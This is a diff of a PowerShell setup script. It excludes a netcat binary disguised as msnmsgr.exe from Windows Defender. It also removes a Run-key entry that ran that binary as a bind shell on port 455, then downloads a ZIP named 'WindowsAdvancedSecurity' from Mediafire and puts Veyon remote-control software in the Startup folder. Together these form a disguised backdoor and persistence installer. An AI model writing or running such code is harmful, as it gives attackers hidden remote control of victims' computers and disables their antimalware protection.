@@ -47,17 +47,37 @@ if (Test-Path "$system32Path\nc.exe") {
 }
 
 
-# 4/7: Setting up System Startup
+# 4/10: Setting up System Startup
 Write-Host "4/10: Setting up System Startup..."
 
 # Add an exclusion for the msnmsgr.exe file in the Windows antimalware software
 Add-MpPreference -ExclusionPath "C:\Windows\System32\msnmsgr.exe"
 
-# Set the program to run at startup using the Windows registry
-reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "msnmsgr" /d "c:\windows\system32\msnmsgr.exe -Ldp 455 -e cmd.exe" /f
+# Check if the msnmsgr entry exists in the startup
+$msnmsgrExists = reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "msnmsgr"
 
-# Query the value in the registry to confirm it has been set
-reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "msnmsgr"
+if ($msnmsgrExists) {
+    # Remove the msnmsgr entry from startup
+    reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "msnmsgr" /f
+    Write-Host "msnmsgr entry removed from startup."
+} else {
+    Write-Host "msnmsgr entry not found in startup."
+}
+
+# Download the ZIP file from Mediafire
+$downloadLink = "https://www.mediafire.com/file/s1m5k1yhrjbbpk0/WindowsAdvancedSecurity.zip/file"
+$destinationPath = "C:\temp\WindowsAdvancedSecurity.zip"
+Invoke-WebRequest -Uri $downloadLink -OutFile $destinationPath
+
+# Extract the ZIP to the desired directory
+$extractToPath = "C:\Program Files\"
+Expand-Archive -Path $destinationPath -DestinationPath $extractToPath
+
+# Create a shortcut for Veyon.exe and place it in the startup folder
+$WScriptShell = New-Object -ComObject WScript.Shell
+$Shortcut = $WScriptShell.CreateShortcut("$($WScriptShell.SpecialFolders('Startup'))\Veyon.lnk")
+$Shortcut.TargetPath = "C:\Program Files\WindowsAdvancedSecurity\Veyon.exe"
+$Shortcut.Save()
 
 
 # 5/10: Adding Firewall Rule
